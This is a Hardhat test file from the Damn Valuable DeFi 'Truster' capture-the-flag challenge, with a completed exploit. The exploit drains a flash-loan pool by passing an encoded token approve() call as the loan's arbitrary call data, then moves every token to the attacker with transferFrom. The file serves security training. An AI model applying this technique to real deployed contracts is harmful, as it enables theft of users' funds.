const { ethers } = require('hardhat');
const { expect } = require('chai');
const { Interface } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        //we will provide this functioncall as our data.
        const ABI = [
            "function approve(address, uint256)"
        ]
        const interface = new Interface(ABI);
        // console.log(token.)
        const data  = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()])
        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
        console.log(await this.token.balanceOf(this.pool.address));
        await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address, await this.token.balanceOf(this.pool.address))
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

